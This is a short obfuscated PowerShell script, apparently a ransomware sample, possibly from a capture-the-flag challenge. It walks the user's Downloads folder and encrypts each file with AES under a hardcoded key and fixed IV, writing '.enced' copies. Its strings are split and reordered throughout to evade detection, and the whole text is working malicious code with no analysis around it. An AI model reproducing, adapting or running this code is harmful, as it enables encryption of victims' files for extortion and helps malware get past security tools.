$a = "$HOME\\downloads"

[Reflection.Assembly]::('Lo'+'adFi'+'le').Invoke("C:\WINDOWS\Microsoft.NET\Framework\v2.0.50727\System.Web.dll") | &("{0}{1}" -f 'out-','null')


.("{2}{1}{0}" -f'-ChildItem','et','G') -Path $a | &("{2}{0}{1}"-f'ch-Ob','ject','Forea') {
        $ert = $_."FU`LLnAME" + ("{0}{1}{2}"-f '.e','n','ced')
        $stuff = &("{1}{2}{0}"-f't','Get-Con','ten') $_."fu`LlnaMe"

        $drt = [System.Convert]::('F'+'romBase'+'6'+'4Strin'+'g').Invoke(("{0}{3}{2}{1}{5}{4}"-f 'SF','0bnMwbTN3aDNS','I','RCe3','Q==','f'))
        $r = &("{2}{1}{0}{3}" -f 'b','O','new-','ject') ("{10}{5}{1}{0}{9}{3}{6}{7}{2}{4}{8}"-f'ecurit','.S','dae','gr','lMan','ystem','aphy.Rij','n','aged','y.Crypto','S')
        $c = $r.('Cre'+'ateEn'+'cry'+'pto'+'r').Invoke($drt, (1..16))
        $ms = &("{2}{1}{0}"-f 'ct','bje','new-O') ("{3}{1}{0}{2}"-f 't','O.MemoryS','ream','I')
        $cs = &("{0}{1}{2}" -f'n','ew-','Object') ("{2}{4}{5}{0}{7}{1}{9}{3}{8}{6}" -f'Cry','g','S','Crypt','ecuri','ty.','am','pto','oStre','raphy.') $ms,$c,("{0}{1}"-f'W','rite')
        $sw = &("{1}{2}{0}"-f 't','new','-Objec') ("{0}{2}{4}{1}{3}" -f 'IO','am','.Str','Writer','e') $cs
        $sw.('Writ'+'e').Invoke($stuff)
        $sw.('C'+'lose').Invoke()
        $cs.('C'+'lose').Invoke()
        $ms.('Clos'+'e').Invoke()
        $r.('Clea'+'r').Invoke()
        [byte[]]$uts = $ms.('ToAr'+'ray').Invoke()
        [io.file]::('W'+'rite'+'Al'+'l'+'Bytes').Invoke($ert,$uts)
}